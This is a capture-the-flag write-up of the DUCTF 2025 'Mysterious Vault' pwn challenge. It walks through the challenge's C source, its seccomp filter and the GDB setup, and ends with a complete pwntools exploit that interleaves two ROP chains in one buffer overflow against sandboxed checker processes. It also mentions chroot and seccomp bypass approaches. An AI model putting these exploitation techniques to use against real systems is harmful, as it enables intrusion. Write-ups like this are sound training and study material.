---
title: Writeup - Mysterious Vault (DUCTF 2025)
date: 2025-07-22 00:00:00
tags: 
- writeup
- pwn
- ductf2025
---

# DUCTF 2025 - Mysterious Vault
## Description
```markdown
You've discovered a mysterious vault exposed on a server - surely, if you can break 
in, great rewards will follow...

`nc chal.2025-us.ductf.net 30019`

[mysterious-vault.zip]
```

## Writeup
Inside the [provided zip file](/static/ductf-mysteriousvault/mysterious-vault.zip) was [a Dockerfile](/static/ductf-mysteriousvault/Dockerfile), [`nsjail.cfg`](/static/ductf-mysteriousvault/nsjail.cfg), the main executable [`mysterious_vault`](/static/ductf-mysteriousvault/mysterious-vault) and [its source code](/static/ductf-mysteriousvault/mysterious-vault.c), and two other executables [`password_handler_3000`](/static/ductf-mysteriousvault/password_handler_3000) and [`password_handler_3001`](/static/ductf-mysteriousvault/password_handler_3001) along with [their source code](/static/ductf-mysteriousvault/password_handler_300X.c). Lastly, two directories `checker1-trusted-env/` and `checker2-trusted-env/` were also provided with a `password` file inside that was never referenced or used in the challenge. That was a lot more files than are usually included in pwn challenges so it took a hot second to break down everything that was inside.

### `mysterious_vault`
The code for `mysterious_vault` is below:
```c
// includes

unsigned char raw_hash[SHA256_DIGEST_LENGTH];
unsigned char hash[0x65];

#define CORRECT_PASSPHRASE "\x31\xd2\x48\x8d\x35\x1c\x00\x00\x00\x80\xfa\x1b\x7d\x0a\x80\x36\x42\xfe\xc2\x48\xff\xc6\xeb\xf1\xbf\x01\x00\x00\x00\x48\x29\xd6\x89\xf8\x0f\x05\xc3\x1b\x2d\x37\x62\x24\x2d\x37\x2c\x26\x62\x36\x2a\x27\x62\x27\x23\x31\x36\x27\x30\x62\x27\x25\x25\x62\x78\x6b"

#define PASS_LEN 0x40
#define BUFSZ 0x200
#define SHARED_ADDR 0x1337000


void setup() {
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);

	int shmid = shmget(0xdeadbeef, 0x20, IPC_CREAT);
	if (shmid < 0) {
		fprintf(stderr, "ERROR. CRITICAL ERROR FOR `shmget`. PLEASE CONTACT ADMINISTRATIVE ENTITIES\n");
		exit(1);
	}

	void* res = shmat(shmid, (char*)SHARED_ADDR, 0);
	if (res == (void*)-1) {
		fprintf(stderr, "ERROR. CRITICAL ERROR FOR `shmid`. PLEASE CONTACT ADMINISTRATIVE ENTITIES\n");
		exit(1);
	}
}

void spawn_checkers() {
	if (fork() == 0) {
		puts("SPAWNING CHECKER 0x1");

		if (chroot("./checker1-trusted-env")) {
			fprintf(stderr, "ERROR. CRITICAL ERROR FOR `chroot`. PLEASE CONTACT ADMINISTRATIVE ENTITIES\n");
			exit(1);
		}

		if (execve("password_handler_3000", NULL, NULL)) {
			fprintf(stderr, "ERROR. CRITICAL ERROR FOR `execve`. PLEASE CONTACT ADMINISTRATIVE ENTITIES\n");
			exit(1);
		}
	}

	if (fork() == 0) {
		puts("SPAWNING CHECKER 0x2");

		if (chroot("./checker2-trusted-env")) {
			fprintf(stderr, "ERROR. CRITICAL ERROR FOR `chroot`. PLEASE CONTACT ADMINISTRATIVE ENTITIES\n");
			exit(1);
		}

		if (execve("password_handler_3001", NULL, NULL)) {
			fprintf(stderr, "ERROR. CRITICAL ERROR FOR `execve`. PLEASE CONTACT ADMINISTRATIVE ENTITIES\n");
			exit(1);
		}
	}
}

void get_flag() {
	// open/read/write the flag file
}

int main() {
	char name[BUFSZ] = {0};
	char passwd[BUFSZ] = {0};
	size_t name_len = 0;
	size_t passwd_len = 0;

	setup();

	printf("ACCESS REQUIRED. ENTER USERNAME: ");
	name_len = read(0, name, BUFSZ-1);

	printf("ENTER PASSCODE: ");
	passwd_len = read(0, passwd, BUFSZ-1);

	*((int*)SHARED_ADDR) = 0;
	*((int*)(SHARED_ADDR+4)) = passwd_len;

	memcpy((char*)SHARED_ADDR+8, passwd, passwd_len);

	printf("AUTHENTICATING");
	for (int i = 0 ; i < 3 ; i++)
		sleep(1); printf(".");
	printf("\n");

	spawn_checkers();

	pid_t wpid = 0;
	int status = 0;
	while ((wpid = wait(&status)) > 0) {
		if (WIFEXITED(status)) {
			if (WEXITSTATUS(status) != 0) {
				printf("PASSWORD CHECKER HAS FAILED. THE VAULT SHALL REMAIN CLOSED.\n");
				exit(1);
			}
		}
		else {
			printf("PASSWORD CHECKER HAS FAILED. THE VAULT SHALL REMAIN CLOSED.\n");
			exit(1);
		}
	}

	if (!memcmp((char*)SHARED_ADDR, CORRECT_PASSPHRASE, PASS_LEN)) {
		printf("ACCESS GRANTED. THE VAULT SHALL BE OPENED.\n");
		get_flag();
	} else {
		printf("DENIED. THE VAULT SHALL REMAIN CLOSED FOR ALL OF ETERNITY.\n");
	}

	return 0;
}
```

The first function called, `setup()`, made calls to `shmget()` and `shmat()` which I was unfamiliar with.

* `int shmget(key_t key, size_t size, int shmflg)` ([ref](https://man7.org/linux/man-pages/man2/shmget.2.html))
    * `shmget()` retrieves or creates a System V shared memory segment. These shared memory segments are custom mapped memory segments that can be shared by multiple processes at the same time.
    * `key` is a unique identifier that each process uses to access the shared memory segment.
    * `size` is the minimum size of the segment rounded up to the nearest page size.
    * `shmflg` are flag options provided to it.
    * The return value is an integer identifying the segment that can be passed into `shmat`.
* `void *shmat(int shmid, const void *shmaddr, int shmflg)` ([ref](https://man7.org/linux/man-pages/man3/shmat.3p.html))
    * `shmat()` takes an ID returned from `shmget()` and provides the virtual memory address of the shared memory segment.
    * `shmid` is the ID from `shmget()`
    * `shmaddr` is the address that the process would like this memory segment to be mapped at. If this argument is `NULL`, then the system chooses the address.
    * `shmflg` are flag options provided to it.

In our case, `shmget()` and `shmat()` were used to create a new shared memory segment at address `0x1337000` with a size of 0x1000 bytes (they provided 0x20 but was rounded up to nearest page size). Note that the default memory permissions for shared memory segments is RW-only.

After creating the segment, a password of up to 512 bytes is read into a stack buffer and the following fields are written to the shared memory segment:
* `state` (`int`) - A state of 0 meant "Ready for password authentication", 1 meant "Password checker 1 retrieved pwd", and 2 meant "Password checker 2 retrieved pwd"
* `length` (`int`) - The length of the password in the shared memory segment
* `password` (`char []`) - The password

The `spawn_checkers()` function is then called. It forks twice and has each child process call `chroot('./checkerX-trusted-env')` and `execve('./password_handler_300X')`. It then enters a while true loop where it consistently calls `wait()`; the `wait()` function returns whether or not the child processes have finished executing and some information about them. This loop checks if the child process has exited cleanly and what the exit status is. The exit status is either the return value from the `main()` function, or the argument passed in to the `exit()` function/syscall. If the exit status is not 0, then it throws an error and exits.

Assuming both password checker child processes exit cleanly with status 0, it compares the shared memory segment buffer with a 64-byte hard-coded byte sequence, and if they are the same, it runs the `get_flag()` function. 

Therefore, we can determine that **our goal is to have both password checker exit cleanly, and have one of them write the hard-coded byte sequence to the shared memory segment**.

### Password Checkers
The password checkers were designed to be sandboxed processes that handled the untrusted user input, like something you might see inside of a browser. Both password checker binaries used the same source code, but had been compiled with different ABIs or ELF setups:
```
password_handler_3000:   ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), 
    statically linked, BuildID[sha1]=1c64932af2692dc49fa04c3f5f8d4b8df1d903c6, for 
    GNU/Linux 3.2.0, stripped
password_handler_3001:   ELF 64-bit LSB executable, x86-64, version 1 (SYSV), 
    statically linked, BuildID[sha1]=7e83b4b1368736dd6163525931fdcf33e906ec77, stripped
```

They both were stripped, statically-linked binaries and also both had the same protecttions:
```
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
```

Inside of their setup, they also called the `shmget()` and `shmat()` functions to map the shared memory segment identified by the key `0xdeadbeef` at the address `0x1337000`. They closed stdout/stderr/stdin, and called a `setup_sandbox()` function. This `setup_sandbox()` function made two calls to `prctl()` in order to set up seccomp with a custom filter. By using `seccomp-tools`, I was able to find the filter looked like this:
```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x05 0xffffffff  if (A != 0xffffffff) goto 0010
 0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009
 0006: 0x15 0x02 0x00 0x00000001  if (A == write) goto 0009
 0007: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0009
 0008: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x06 0x00 0x00 0x00000000  return KILL
```

This filter only allowed the `read`, `write`, `exit`, and `open` syscalls and would break otherwise.

The main code was fairly simple with an easy-to-spot vulnerability:
```c
int main() {
	setup();

	char password[200] = {0};
	int passwd_len = 0;

	passwd_len = *((int*)(SHARED_ADDR+4));
	memcpy(password, (char*)SHARED_ADDR+8, passwd_len);
	*((int*)SHARED_ADDR) += 1;

	//Synchronise
	while (*((volatile int*)SHARED_ADDR) != 2) {}

	if (strcspn(password, "password") != strlen(password)) {
		exit(1);
	}

	return 0;
}
```

The password provided by the main `mysterious_vault` binary (which could be up to 512 bytes) was copied into a stack buffer of size 200 leading to an obvious buffer overflow. It then added one to the `state` in the shared memory segment and waited for it to equal 2, meaning both password checkers had retrieved it. It then ran a quick check to ensure that none of the characters in the word "password" were present in the provided password, and returned 0 if that was the case.

### Approach
Okay, so we know:
* Our goal is to have both checkers exit cleanly, and have a hard-coded byte sequence in the shared memory segment
* There is an easy buffer overflow in the password checkers with a large overflow length, no stack canaries, and no PIE
* Both checkers are statically-linked, meaning there's **lots** of ROP gadgets available

The hard part, though, is that we can only specify **one password**, and therefore a single stream of bytes that need to act as a ROP chain for **two different binaries** with *different gadgets and addresses*.

My first thought was to try to cheese the challenge by doing ORW on the `flag.txt` file. Even though seccomp was set up in the flag checkers, the ORW syscalls were allowed. stdin/stderr/stdout were all closed, but I figured I could re-open them using the open syscall. The first roadblock was the fact that `chroot()` was called, so the flag file wasn't technically mapped in our file space. [Chroot](https://tbhaxor.com/breaking-out-of-chroot-jail-shell-environment/) is not a hard security boundary and can be bypassed, but requires the use of the `mkdir`, `chroot`, and `chdir` syscalls, which we didn't have access to. I looked into seccomp bypasses and found [2 of them](https://n132.github.io/2022/07/03/Guide-of-Seccomp-in-CTF.html#improper-filters), but the seccomp filter specifically blocked both of them.

I then thought that if the shared memory segment was RWX, we could put shellcode in there and that would allow us to easily figure out a ROP chain that worked for both. Unfortunately, shared memory segments are mapped as RW-only by default.

I then used `cyclic()` from pwntools to test the padding lengths for each binary and found they differed - the ROP chain for 3000 required 232 bytes of padding, and the ROP chain for 3001 required 216 bytes of padding. Since the padding differed, we could be selective in our use of gadgets and interleave the two ROP chains. Since only one process needed to write the hard-coded byte sequence to the shared memory segment, we could just have the other one immediately exit with status code 0.

To make things easy, I decided my payload (password) would be:
* Padding
* ROP chain for 3000 that called exit (single gadget)
* ROP chain for 3001 that used the `rep movsb` instruction to write the hard-coded byte sequence to the beginning of the memory segment
* Hard-coded byte sequence

### Debugging
Because the forking, execves, and synchronization between all three processes, debugging it was a little more complicated. First off, everything had to be run with sudo perms so it could set up the sandbox and shared memory segments appropriately. I learned about the following GDB commands:

* `set follow-fork-mode [parent|child]` - when `fork()` is called and the process is split into two, this determines which process will be in focus in GDB
* `set detach-on-fork [on|off]` - the default behavior for `fork()` in GDB is to detach from the out-of-focus process to let it do it's thing. Since we didn't want that, we set this to "off"
* `set follow-exec-mode [new|same]` - the `execve` syscall replaces the current process, and "same" meant to keep the same inferior, but "new" meant to create a new inferior. An inferior is like a child process that's debuggable in the same GDB session
* `catch exec` - when `execve` replaces the current process, it stops at the beginning of the new process so it can be properly debugged
* `inferior X` - using `info inferiors` showed all the inferiors and their numbers, and this command was used to switch between inferiors

The two base GDB scripts I used in my solve script were:
```
# track both children
set follow-fork-mode parent
set detach-on-fork off
set follow-exec-mode new
catch exec

# have main process stopped at wait() function
b wait
continue

# have checker 1 stopped at beginning
inferior 2
c
b *0x401a95

# have checker 2 stopped at beginning
inferior 3
c
b *0x4012a8
```
and
```
# let children do their thing and just follow the main process
set follow-fork-mode parent
b wait
continue
```

### Exploitation
Since the main process used `read()` to get our input, we weren't restricted on any characters and could freely use what we wanted. The checkers also made sure that the letters in "password" weren't present, but only checked up to the first null byte, so I made the first 9 bytes of padding `b"b\x00bbbbbb"`. I also included the 64-byte hard-coded byte sequence in the padding (starting at address 0x1337020) just to save some space.

At byte 216, I placed the first ROP chain for checker 3001. I used the gadget `mov rax,qword ptr[rbp-0x8]; mov rdi,qword ptr[rbp-0x10]; syscall`, which would populate `$rax` and `$rdi` from the attacker-controlled `$rbp` register. I set `$rbp` to partway through the shared 0x1337000 segment and had it put 0x3c into `$rax` (exit syscall) and 0 into `$rdi` (exit status). Note that I tried calling `exit(0)` first, but the `exit()` function actually uses the `exit_group` syscall instead of `exit`. Due to our seccomp filter, the `exit_group` syscall would actually cause the checker to throw a fit and not exit cleanly.

For the checker 3000 ROP chain, I used various ROP gadgets to set up the registers for the `rep movsb` instruction. If you're not familiar with that instruction, it's pretty much a built-in `memcpy()` instruction. The `$rcx` register contains the number of bytes to move, `$rdi` contains the starting destination address, and `$rsi` contains the starting source address. I ended this ROP chain with a single gadget that set up the `exit` syscall with the 0 status.

I also had to take into account some concurrent execution issues. Checker 3000 was spun up first, and it's job was to write data to the shared memory segment. If it wrote stuff there before checker 3001 could pull the ROP chain, then checker 3001 would not fail nicely. To add in a small delay, I set up a second `rep movsb` instruction that copied 0x5000 bytes to itself+1 inside of the writable segment of the process that ran before copying the hard-coded sequence to the shared memory segment.

My final solve script ([also here](/static/ductf-mysteriousvault/solve.py)) was:
```python
from pwn import *


# initialize the binary
binary = "./mysterious_vault"
elf = context.binary = ELF(binary, checksec=False)

# sets it up so both child processes break after forking, but we don't follow them
# then, parent process breaks at wait() so we can switch to the child processes
gs = """
set follow-fork-mode parent
set detach-on-fork off
set follow-exec-mode new
catch exec
b wait
continue

inferior 2
c
b *0x401a95

inferior 3
c
b *0x4012a8
"""
# uncomment to let both child processes do their thing
# gs = """
# set follow-fork-mode parent
# b wait
# continue
# """

if args.REMOTE:
    p = remote("chal.2025-us.ductf.net", 30019)
elif args.GDB:
    context.terminal = ["tmux", "splitw", "-h", "-l", "65%"]
    p = gdb.debug(binary, gdbscript=gs)
else:
    p = elf.process()


### OVERFLOW ###
p.sendline(b'c'*0x1fe)
payload = flat(
    # padding
    b'b\x00',                               # just to pass the first check
    b'b'*6,
    p64(0),                                 # 0x1337010 - exit code
    p64(0x3c),                              # 0x1337018 - exit syscall number

    # 0x1337020 - the 64-byte pattern that needs to go into 0x1337000
    b"\x31\xd2\x48\x8d\x35\x1c\x00\x00\x00\x80\xfa\x1b\x7d\x0a\x80\x36\x42\xfe\xc2\x48\xff\xc6\xeb\xf1\xbf\x01\x00\x00\x00\x48\x29\xd6\x89\xf8\x0f\x05\xc3\x1b\x2d\x37\x62\x24\x2d\x37\x2c\x26\x62\x36\x2a\x27\x62\x27\x23\x31\x36\x27\x30\x62\x27\x25\x25\x62\x78\x6b",

    b'a'*120,                               # remaining padding padding

    # 3001 ROP chain - does syscall(exit, 0)
    p64(0x1337020),                         # rbp - set for the gadget
    p64(0x401a5a),                          # rip - mov rax,qword ptr[rbp-0x8]; mov rdi,qword ptr[rbp-0x10]; syscall

    # 3000 ROP chain
    b'd'*8,                                 # rbp

    # adding in a loop here so we can "sleep" for a bit while the second child does its thing
    # so we will be writing to 0x4a6000 from 0x4a6001 for n iterations
    p64(0x461383),                          # pop rcx; cwde; add al, 0; ret
    p64(0x5000),                            # n = number of instructions to "sleep" for
    p64(0x404fe2),                          # pop rsi; ret
    p64(0x4a6000),                          # source address
    p64(0x46c4be),                          # pop rdi; ret
    p64(0x4a6001),                          # destination address
    p64(0x413c6b),                          # rep movsb byte ptr [rdi], byte ptr [rsi]; ret

    # now, we actually move the 64-byte pattern from 0x1337020 to 0x1337000
    p64(0x461383),                          # pop rcx; cwde; add al, 0; ret
    p64(0x40),                              # number of bytes to move

    p64(0x404fe2),                          # pop rsi; ret
    p64(0x1337020),                         # source address

    p64(0x46c4be),                          # pop rdi; ret
    p64(0x1337000),                         # destination address

    p64(0x413c6b),                          # rep movsb byte ptr [rdi], byte ptr [rsi]; ret
    p64(0x401ffa),                          # exit(0)
)
p.send(payload)
p.interactive()
```

This was a fun problem getting introduced to multi-exploitation in a sandboxed environment and took me just over 3.5 hours to solve.

**Flag**: `DUCTF{pushing_and_popping_and_so_on_and_so_forth}`